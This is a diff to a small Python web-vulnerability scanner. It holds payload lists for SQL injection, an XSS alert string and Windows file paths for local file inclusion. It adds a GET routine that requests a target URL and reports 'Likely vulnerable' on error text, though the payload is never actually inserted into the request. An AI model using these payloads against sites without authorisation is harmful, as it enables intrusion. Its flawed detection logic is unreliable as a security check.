@@ -1,4 +1,4 @@
-import argparse, urllib, os, sys
+import argparse, urllib.request, os, sys
 
 sqli = ["'", "\"", "`", "and 1=0", "or 1=0", "' and 1=0", "' or 1=0", "\" and 1=0", "\" or 1=0", "`and 1=0", "` or 1=0"]
 xss = ["';alert(String.fromCharCode(88,83,83))//",
@@ -31,7 +31,7 @@ lfi = ["C:\boot.ini",
         "C:\home\bin\stable\apache\php.ini",
         "C:\Program Files\Apache Group\Apache\logs\access.log",
         "C:\Program Files\Apache Group\Apache\logs\error.log",
-        "C\WINDOWS\TEMP\\",
+        "C:\WINDOWS\TEMP\\",
         "C\php\sessions\\",
         "C:\php5\sessions\\",
         "C:\php4\sessions\\"]
@@ -50,15 +50,17 @@ def clearScreen():
     ''')
 
 def get():
-    i = input("\n\t1. SQLi\n\t2. XSS\n\t3. LFI\n\t4. RFI\n\t5. RCE\n")
-    if i=="1":atk = sqli
-    elif i=="2":atk = xss
-    elif i=="3":atk = lfi
-    elif i=="4":atk = rfi
-    elif i=="5":atk = rce
+    x = input("\n\t1. SQLi\n\t2. XSS\n\t3. LFI\n\t4. RFI\n\t5. RCE\n")
+    if x=="1":atk = sqli
+    elif x=="2":atk = xss
+    elif x=="3":atk = lfi
+    elif x=="4":atk = rfi
+    elif x=="5":atk = rce
     for i in atk:
-        r = 1
-    print(atk)
+        with urllib.request.urlopen(args.url) as response:
+           html = response.read().lower()
+        if b'error' in html and b'query' in html:print(str(i) + ". Likely vulnerable.")
+        else:print(str(i) + ". No vulnerability detected.")
 
 def post():
     print("POST functionality not yet developed.")
@@ -77,9 +79,6 @@ args = parser.parse_args()
 
 clearScreen()
 
-try:
-    if args.method.lower() == 'get':get()
-    elif args.method.lower() == 'post':post()
-    elif args.method.lower() == 'cookie':cookie()
-except:
-    parser.print_help()
+if args.method.lower() == 'get':get()
+elif args.method.lower() == 'post':post()
+elif args.method.lower() == 'cookie':cookie()
